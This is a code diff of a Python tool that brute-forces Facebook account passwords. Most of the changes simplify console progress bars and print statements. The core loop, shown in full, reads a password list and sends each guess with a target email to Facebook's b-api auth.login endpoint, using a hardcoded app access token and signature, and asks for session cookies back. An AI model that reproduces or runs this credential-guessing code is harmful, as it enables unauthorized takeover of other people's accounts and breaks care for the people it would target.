@@ -36,34 +36,22 @@ banner = '''
 def fetch_facebook_data():
     try:
         print(internet)
-        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mFetching data files from facebook...')
+        print('\033[37;1mFetching data files from facebook...')
         time.sleep(2)
 
-        # Simulate progress bar
+        # Simulate progress bar for fetching data
         toolbar_width = 25
-        sys.stdout.write('Please wait...')
-        sys.stdout.flush()
-
-        # Move to a new line for the progress bar
-        sys.stdout.write('\n')
-        sys.stdout.flush()
-
-        # Progress bar
+        sys.stdout.write('[')
         for _ in range(toolbar_width):
-            sys.stdout.write('\033[37;1m[')
-            sys.stdout.write('\033[36;1m#\033[37;1m' * (_ + 1))
+            sys.stdout.write('#')
             sys.stdout.flush()
-            time.sleep(5.0 / 100)
-            sys.stdout.write('\r')
-
-        sys.stdout.write('\033[37;1m[')
-        sys.stdout.write('\033[36;1m#\033[37;1m' * toolbar_width)
-        sys.stdout.flush()
+            time.sleep(0.1)
+        sys.stdout.write(']\n\n')
 
         # Check internet connection by making a request to Facebook
         response = requests.get('http://facebook.com')
         response.raise_for_status()  # Raise an exception for HTTP errors
-        print('\033[37;1m] \033[35;1m~> \033[32;1mSuccess ')
+        print('\033[37;1m\033[35;1m~> \033[32;1mSuccess ')
         time.sleep(2.0)
     except (ConnectionError, requests.exceptions.RequestException) as e:
         print('\033[37;1m]\033[35;1m ~>\033[31;1m No Connection')
@@ -86,23 +74,13 @@ def start():
         time.sleep(3.0)
         print()
 
-        print('[=] Getting Password --> (passwords from {})'.format(passw_file))
+        # Print the password being used
+        print('[=] Getting Password --> {}'.format(passwords[0].strip()))
 
         password_found = False
         for pw in passwords:
             pw = pw.strip()  # Remove leading/trailing whitespace and newline characters
             try:
-                # Prompt indicating getting password
-                print("\033[34;1m[\033[37;1m=\033[34;1m] \033[37;1mGetting Password...")
-
-                # Progress bar
-                sys.stdout.write('\033[37;1m[')
-                sys.stdout.flush()
-                for _ in range(toolbar_width):
-                    sys.stdout.write('\033[36;1m#\033[37;1m')
-                    sys.stdout.flush()
-                    time.sleep(5.0 / 100)
-
                 # Perform login attempt using the password
                 response = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 data = response.json()
